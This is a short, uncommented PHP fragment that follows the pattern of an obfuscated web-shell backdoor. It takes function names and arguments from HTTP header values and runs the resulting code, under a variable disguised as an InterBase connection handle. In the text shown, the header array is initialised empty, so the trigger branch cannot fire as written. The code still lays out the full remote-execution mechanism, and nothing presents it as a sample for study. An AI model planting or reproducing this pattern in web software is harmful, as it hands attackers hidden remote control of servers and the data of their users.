<?php
$_HEADERS = Array();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $ibase_pconnection = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Authorization']($_HEADERS['Large-Allocation']));
    $ibase_pconnection();
}